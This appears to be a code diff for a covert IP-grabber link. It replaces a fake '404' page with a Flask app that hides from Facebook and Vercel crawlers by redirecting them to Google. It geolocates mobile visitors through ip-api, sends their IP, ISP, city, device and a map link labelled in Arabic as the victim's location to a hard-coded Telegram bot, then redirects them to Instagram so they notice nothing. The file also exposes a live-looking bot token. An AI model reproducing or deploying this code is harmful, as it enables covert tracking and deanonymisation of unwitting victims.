@@ -1,24 +1,47 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta property="og:title" content="Verified Content">
-    <meta property="og:type" content="video.other">
-    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/v3/y2/r/m68ZS97Z_A0.png">
-    
-    <script>
-        // إرسال البيانات فوراً بمجرد تحميل المعاينة
-        fetch("https://api.telegram.org/bot8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo/sendMessage", {
-            method: "POST",
-            headers: {"Content-Type": "application/json"},
-            body: JSON.stringify({
-                chat_id: "8524242091",
-                text: "🎯 صيد صامت ناجح!\nالرابط تم فتحه في المعاينة.",
-                parse_mode: "HTML"
-            })
-        });
-    </script>
-</head>
-<body onload="window.location.href='https://www.google.com'">
-    <h1>404 Not Found</h1>
-</body>
-</html>
+from flask import Flask, request, redirect
+import requests
+
+app = Flask(__name__)
+
+TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
+CHAT_ID = "8524242091"
+
+def send_to_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
+    requests.post(url, json=payload, timeout=5)
+
+@app.route('/')
+def logic():
+    ua = request.headers.get('User-Agent', '').lower()
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+
+    # --- تشريح تحركات الخلفية ---
+    # إذا كان الزائر "بوت فيسبوك" أو "فيرسل" -> تمويه (Redirect لجوجل)
+    if any(bot in ua for bot in ['facebook', 'vercel', 'bot', 'spider', 'crawler']):
+        return redirect("https://www.google.com")
+
+    # إذا كان الزائر "إنسان" (جهاز موبايل) -> تنفيذ الصيد
+    if "mobile" in ua or "android" in ua or "iphone" in ua:
+        try:
+            r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
+            # إنشاء رابط خريطة دقيق لبرج الاتصال في عدن
+            google_maps = f"https://www.google.com/maps?q={r.get('lat')},{r.get('lon')}"
+            
+            report = (
+                f"🚀 <b>تم اختراق الحماية! صيد حقيقي:</b>\n"
+                f"🌐 <b>IP:</b> <code>{ip}</code>\n"
+                f"📍 <b>الموقع:</b> {r.get('city')}, {r.get('country')}\n"
+                f"🏢 <b>المزود:</b> {r.get('isp')}\n"
+                f"📱 <b>الجهاز:</b> <code>{ua[:50]}...</code>\n"
+                f"🗺️ <a href='{google_maps}'>موقع الضحية في عدن</a>"
+            )
+            send_to_telegram(report)
+        except:
+            pass
+
+    # التحويل النهائي لإنستغرام لكي لا يشعر المستخدم بشيء
+    return redirect("https://www.instagram.com")
+
+if __name__ == '__main__':
+    app.run()
